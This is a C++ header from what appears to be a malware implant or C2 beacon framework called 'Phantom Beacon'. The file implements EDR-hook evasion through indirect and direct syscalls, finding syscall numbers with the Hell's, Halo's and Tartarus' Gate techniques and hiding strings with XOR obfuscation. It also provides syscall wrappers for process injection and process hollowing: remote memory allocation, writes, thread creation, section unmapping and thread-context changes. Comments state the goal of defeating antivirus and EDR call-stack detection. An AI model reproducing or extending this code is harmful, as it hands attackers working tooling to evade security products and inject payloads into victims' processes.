#pragma once
// ============================================================================
//  syscalls.h — Phantom Beacon Indirect Syscalls (Fully Corrected)
//  ──────────────────────────────────────────────────────────────
//  Bypasses user-mode hooks by executing syscalls indirectly via ntdll gadgets.
//  Dynamically resolves SSNs using Hell's Gate / Halo's Gate methods.
// ============================================================================

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#include <vector>
#include <algorithm>
#include <cstring>
#include "evasion.h"
#include "crypto.h"

// Firme esterne collegate al modulo Assembly nativo (syscalls.asm / syscalls.o)
extern "C" NTSTATUS execute_syscall(
    uint32_t ssn, 
    uintptr_t gadget, 
    PVOID a1, PVOID a2, PVOID a3, PVOID a4, 
    PVOID a5, PVOID a6, PVOID a7, PVOID a8, 
    PVOID a9, PVOID a10, PVOID a11
);        
extern "C" NTSTATUS execute_syscall_direct(
    uint32_t ssn, 
    PVOID a1, PVOID a2, PVOID a3, PVOID a4, 
    PVOID a5, PVOID a6, PVOID a7, PVOID a8, 
    PVOID a9, PVOID a10, PVOID a11
);
extern "C" uintptr_t syscall_trampoline;
extern "C" uint32_t get_ssn(void* addr);
extern "C" BOOL clear_hw_breakpoints();
extern "C" void flush_cpu_telemetry();

namespace syscalls {

// Halo's Gate / Hell's Gate: Estrae il SSN leggendo i byte o scansionando i vicini se c'è un hook dell'EDR
inline uint32_t find_ssn(uint8_t* pFunc) {
    if (!pFunc) return 0;

    // Sfrutta l'helper nativo in Assembly per leggere i byte corretti senza attivare l'hook
    uint32_t ssn = get_ssn(pFunc);

    // Sanity: a real SSN is small. 0 or huge values mean the direct read was
    // unreliable (patched prologue) — force the neighbor-scan recovery below.
    auto plausible = [](uint32_t v) { return v > 0 && v < 0x1000; };

    // Se la funzione inizia con 0xE9 (JMP), significa che l'User-Mode dell'antivirus ha inserito un hook
    if (pFunc[0] == 0xE9 || !plausible(ssn)) {
        uint32_t up_anchor = 0, down_anchor = 0, up_idx = 0, down_idx = 0;
        // Scansiona i vicini di memoria superiori ed inferiori per ricostruire l'SSN originale
        for (int i = 1; i <= 500; i++) {
            // Vicino superiore
            uint8_t* pNeighbor = pFunc + (i * 32);
            uint32_t v = *reinterpret_cast<uint32_t*>(pNeighbor + 4);
            if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B && pNeighbor[2] == 0xD1 && pNeighbor[3] == 0xB8) {
                // Halo's Gate: prologue pulito → SSN = anchor - i
                uint32_t cand = v - i;
                if (plausible(cand)) { up_anchor = v; up_idx = (uint32_t)i; break; }
            }
            if (up_anchor == 0 && pNeighbor[0] != 0x4C && plausible(v)) {
                // Tartarus' Gate: vicino A SUA VOLTA hookato, ma l'imm32 della
                // 'mov eax, ssn' è sopravvissuto (hook inline parziale).
                up_anchor = v; up_idx = (uint32_t)i;
            }
            // Vicino inferiore
            pNeighbor = pFunc - (i * 32);
            v = *reinterpret_cast<uint32_t*>(pNeighbor + 4);
            if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B && pNeighbor[2] == 0xD1 && pNeighbor[3] == 0xB8) {
                uint32_t cand = v + i;
                if (plausible(cand)) { down_anchor = v; down_idx = (uint32_t)i; break; }
            }
            if (down_anchor == 0 && pNeighbor[0] != 0x4C && plausible(v)) {
                down_anchor = v; down_idx = (uint32_t)i;
            }
        }
        // Preferisci l'ancora Halo pulita; altrimenti usa l'ancora Tartarus.
        // Se entrambe esistono, accettale solo se concordano (±1 tolleranza
        // di bordo sezione) — evita SSN inventati da dati spurii.
        uint32_t from_up   = up_anchor   ? up_anchor   - up_idx   : 0;
        uint32_t from_down = down_anchor ? down_anchor + down_idx : 0;
        if (up_anchor && down_anchor) {
            uint32_t diff = from_up > from_down ? from_up - from_down : from_down - from_up;
            ssn = (diff <= 1) ? from_up : 0;   // disagreement → not trustworthy
        } else if (up_anchor) {
            ssn = from_up;
        } else if (down_anchor) {
            ssn = from_down;
        } else {
            ssn = 0;
        }
    }
    return plausible(ssn) ? ssn : 0;
}

// Cerca l'istruzione 'syscall; ret' (0x0F, 0x05, 0xC3) all'interno della sezione .text della ntdll.dll originale
inline uintptr_t find_syscall_gadget() {
    HMODULE hNtdll = peb::GetModuleByHash(peb::HASH_NTDLL);
    if (!hNtdll) return 0;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        // Usa l'offuscamento di stringa integrato nel framework per nascondere il nome della sezione
        if (!std::strcmp((char*)sectionHeader[i].Name, XOR_DEC(XOR_STR(".text")))) {
            uint8_t* pText = (uint8_t*)hNtdll + sectionHeader[i].VirtualAddress;
            for (DWORD j = 0; j < sectionHeader[i].Misc.VirtualSize - 2; j++) {
                if (pText[j] == 0x0F && pText[j+1] == 0x05 && pText[j+2] == 0xC3) {
                    return (uintptr_t)(pText + j); // Ritorna l'indirizzo esatto del trampolino
                }
            }
        }
    }
    return 0;
}

// Variabile statica globale per memorizzare l'indirizzo del gadget ed evitare scansioni ripetitive
static uintptr_t g_syscall_gadget = 0;

// ── DIRECT SYSCALL HELPERS (embedded `syscall; ret` in our own module) ─────
// These execute the syscall instruction from OUR .text instead of jumping
// into ntdll. The return address on the kernel stack points into our module,
// so EDR call-stack heuristics ("syscall returns into ntdll from shellcode")
// no longer fire.

// Resolve SSN + invoke via the embedded trampoline
inline NTSTATUS direct_syscall(uint32_t ssn, PVOID a1, PVOID a2, PVOID a3,
                                PVOID a4, PVOID a5, PVOID a6, PVOID a7,
                                PVOID a8, PVOID a9, PVOID a10, PVOID a11) {
    return ::execute_syscall_direct(ssn, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}

// Direct NtAllocateVirtualMemory
inline NTSTATUS SysNtAllocateVirtualMemoryDirect(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTALLOCATEVIRTUALMEMORY);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return direct_syscall(ssn, ProcessHandle, BaseAddress, (PVOID)ZeroBits, RegionSize, (PVOID)(ULONG_PTR)AllocationType, (PVOID)(ULONG_PTR)Protect, 0, 0, 0, 0, 0);
}

// Direct NtWriteVirtualMemory
inline NTSTATUS SysNtWriteVirtualMemoryDirect(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTWRITEVIRTUALMEMORY);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return direct_syscall(ssn, ProcessHandle, BaseAddress, Buffer, (PVOID)NumberOfBytesToWrite, NumberOfBytesWritten, 0, 0, 0, 0, 0, 0);
}

// Direct NtProtectVirtualMemory
inline NTSTATUS SysNtProtectVirtualMemoryDirect(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection) {
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTPROTECTVIRTUALMEMORY);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return direct_syscall(ssn, ProcessHandle, BaseAddress, NumberOfBytesToProtect, (PVOID)(ULONG_PTR)NewAccessProtection, OldAccessProtection, 0, 0, 0, 0, 0, 0);
}

// Direct NtCreateThreadEx
inline NTSTATUS SysNtCreateThreadExDirect(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize, PVOID AttributeList) {
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTCREATETHREADEX);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return direct_syscall(ssn, ThreadHandle, (PVOID)(ULONG_PTR)DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, (PVOID)(ULONG_PTR)CreateFlags, (PVOID)ZeroBits, (PVOID)StackSize, (PVOID)MaxStackSize, AttributeList);
}

// ── INIZIO WRAPPERS INDIRETTI DELLE SYSCALL NATIVE ─────────────────────────

// Wrapper per NtProtectVirtualMemory
inline NTSTATUS SysNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTPROTECTVIRTUALMEMORY);
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, NumberOfBytesToProtect, (PVOID)(ULONG_PTR)NewAccessProtection, OldAccessProtection, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtAllocateVirtualMemory
inline NTSTATUS SysNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTALLOCATEVIRTUALMEMORY);
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, (PVOID)ZeroBits, RegionSize, (PVOID)(ULONG_PTR)AllocationType, (PVOID)(ULONG_PTR)Protect, 0, 0, 0, 0, 0);
}

// Wrapper per NtWriteVirtualMemory
inline NTSTATUS SysNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTWRITEVIRTUALMEMORY);
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, Buffer, (PVOID)NumberOfBytesToWrite, NumberOfBytesWritten, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtOpenProcess
inline NTSTATUS SysNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, void* ClientId) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTOPENPROCESS);
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, (PVOID)(ULONG_PTR)DesiredAccess, ObjectAttributes, ClientId, 0, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtCreateThreadEx (Ora interamente convertito a Indirect Syscall nativa con 11 parametri)
inline NTSTATUS SysNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize, PVOID AttributeList) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTCREATETHREADEX);
    if (!pFunc) return 0xC0000001; // STATUS_UNSUCCESSFUL
    
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(
        ssn, 
        g_syscall_gadget, 
        ThreadHandle, 
        (PVOID)(ULONG_PTR)DesiredAccess, 
        ObjectAttributes, 
        ProcessHandle, 
        StartRoutine, 
        Argument, 
        (PVOID)(ULONG_PTR)CreateFlags, 
        (PVOID)ZeroBits, 
        (PVOID)StackSize, 
        (PVOID)MaxStackSize, 
        AttributeList
    );
}

// Wrapper per NtUnmapViewOfSection (Process Hollowing)
inline NTSTATUS SysNtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTUNMAPVIEWOFSECTION);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtGetContextThread
inline NTSTATUS SysNtGetContextThread(HANDLE ThreadHandle, PCONTEXT Context) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTGETCONTEXTTHREAD);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ThreadHandle, Context, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtSetContextThread
inline NTSTATUS SysNtSetContextThread(HANDLE ThreadHandle, PCONTEXT Context) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTSETCONTEXTTHREAD);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ThreadHandle, Context, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtResumeThread
inline NTSTATUS SysNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTRESUMETHREAD);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ThreadHandle, SuspendCount, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtClose
inline NTSTATUS SysNtClose(HANDLE Handle) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTCLOSE);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, Handle, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtReadVirtualMemory
inline NTSTATUS SysNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTREADVIRTUALMEMORY);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, Buffer, (PVOID)NumberOfBytesToRead, NumberOfBytesRead, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtQueryInformationProcess
inline NTSTATUS SysNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS InfoClass, PVOID InfoBuffer, ULONG InfoBufferSize, PULONG ReturnLength) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTQUERYINFORMATIONPROCESS);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, (PVOID)(ULONG_PTR)InfoClass, InfoBuffer, (PVOID)(ULONG_PTR)InfoBufferSize, ReturnLength, 0, 0, 0, 0, 0, 0);
}

} // namespace syscalls
#endif
